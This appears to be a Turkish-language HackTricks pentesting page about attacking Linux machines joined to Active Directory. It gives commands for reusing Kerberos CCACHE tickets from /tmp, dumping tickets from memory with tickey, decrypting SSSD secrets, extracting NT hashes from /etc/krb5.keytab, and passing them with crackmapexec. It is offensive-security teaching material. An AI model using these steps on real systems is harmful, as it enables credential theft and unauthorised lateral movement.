# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Bir linux makinesi, bir Active Directory ortamında da bulunabilir.

Bir AD'deki linux makinesi **farklı CCACHE biletlerini dosyalar içinde saklıyor olabilir. Bu biletler, diğer kerberos biletleri gibi kullanılabilir ve kötüye kullanılabilir**. Bu biletleri okumak için, biletin kullanıcı sahibi olmanız veya makine içinde **root** olmanız gerekir.

## Enumeration

### Linux'tan AD enumeration

Linux'ta (veya Windows'ta bash'te) bir AD'ye erişiminiz varsa, AD'yi listelemek için [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) deneyebilirsiniz.

Ayrıca **linux'tan AD'yi listelemenin diğer yollarını** öğrenmek için aşağıdaki sayfayı kontrol edebilirsiniz:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA, Microsoft Windows **Active Directory** için açık kaynaklı bir **alternatif** olup, esasen **Unix** ortamları için tasarlanmıştır. Active Directory'ye benzer yönetim için tam bir **LDAP dizini** ile bir MIT **Kerberos** Anahtar Dağıtım Merkezi'ni birleştirir. CA ve RA sertifika yönetimi için Dogtag **Sertifika Sistemi** kullanarak, akıllı kartlar da dahil olmak üzere **çok faktörlü** kimlik doğrulamayı destekler. Unix kimlik doğrulama süreçleri için SSSD entegre edilmiştir. Daha fazla bilgi için:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

## Biletlerle Oynama

### Pass The Ticket

Bu sayfada, **bir linux ana bilgisayarında kerberos biletlerini bulabileceğiniz farklı yerleri** bulacaksınız, bir sonraki sayfada bu CCache bilet formatlarını Kirbi'ye (Windows'ta kullanmanız gereken format) nasıl dönüştüreceğinizi ve ayrıca bir PTT saldırısı nasıl gerçekleştireceğinizi öğrenebilirsiniz:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

### /tmp'den CCACHE bilet yeniden kullanımı

CCACHE dosyaları, **Kerberos kimlik bilgilerini saklamak için** kullanılan ikili formatlardır ve genellikle `/tmp` içinde 600 izinleriyle saklanır. Bu dosyalar, kullanıcının UID'si ile ilişkili olan **isim formatları, `krb5cc_%{uid}`,** ile tanımlanabilir. Kimlik doğrulama biletinin doğrulanması için, **çevre değişkeni `KRB5CCNAME`** istenen bilet dosyasının yoluna ayarlanmalıdır, bu da yeniden kullanımını sağlar.

Kimlik doğrulama için kullanılan mevcut bileti `env | grep KRB5CCNAME` ile listeleyin. Format taşınabilir ve bilet, **çevre değişkenini ayarlayarak** yeniden kullanılabilir: `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos bilet adı formatı `krb5cc_%{uid}` şeklindedir; burada uid, kullanıcının UID'sidir.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE bilet yeniden kullanımı anahtar halkasından

**Bir işlemin belleğinde saklanan Kerberos biletleri çıkarılabilir**, özellikle makinenin ptrace koruması devre dışı bırakıldığında (`/proc/sys/kernel/yama/ptrace_scope`). Bu amaçla yararlı bir araç [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) adresinde bulunur; bu araç, oturumlara enjekte ederek biletleri `/tmp` dizinine dökme işlemini kolaylaştırır.

Bu aracı yapılandırmak ve kullanmak için aşağıdaki adımlar izlenir:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Bu prosedür, çeşitli oturumlara enjekte etmeyi deneyecek ve başarıyı `/tmp` dizininde `__krb_UID.ccache` adlandırma kuralıyla çıkarılan biletleri depolayarak gösterecektir.

### SSSD KCM'den CCACHE bilet yeniden kullanımı

SSSD, veritabanının bir kopyasını `/var/lib/sss/secrets/secrets.ldb` yolunda tutar. İlgili anahtar, `/var/lib/sss/secrets/.secrets.mkey` yolunda gizli bir dosya olarak saklanır. Varsayılan olarak, anahtar yalnızca **root** izinleriniz varsa okunabilir.

**`SSSDKCMExtractor`**'ı --database ve --key parametreleriyle çağırmak, veritabanını ayrıştıracak ve **gizli bilgileri şifre çözecektir**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Kimlik bilgisi önbellek Kerberos blob'u, Mimikatz/Rubeus'a geçirilebilecek kullanılabilir bir Kerberos CCache** dosyasına dönüştürülebilir.

### CCACHE biletinin keytab'dan yeniden kullanımı
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab dosyasından hesapları çıkar

Kök ayrıcalıklarıyla çalışan hizmetler için gerekli olan hizmet hesabı anahtarları, **`/etc/krb5.keytab`** dosyalarında güvenli bir şekilde saklanır. Bu anahtarlar, hizmetler için şifreler gibi, sıkı bir gizlilik gerektirir.

Keytab dosyasının içeriğini incelemek için **`klist`** kullanılabilir. Bu araç, anahtar türü 23 olarak belirlendiğinde, kullanıcı kimlik doğrulaması için **NT Hash** dahil olmak üzere anahtar detaylarını görüntülemek üzere tasarlanmıştır.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Linux kullanıcıları için, **`KeyTabExtract`** RC4 HMAC hash'ini çıkarmak için işlevsellik sunar; bu, NTLM hash yeniden kullanımında kullanılabilir.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS'ta, **`bifrost`** anahtar dosyası analizi için bir araç olarak hizmet eder.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Çıkarılan hesap ve hash bilgilerini kullanarak, **`crackmapexec`** gibi araçlar kullanılarak sunuculara bağlantılar kurulabilir.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Referanslar

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{{#include ../../banners/hacktricks-training.md}}
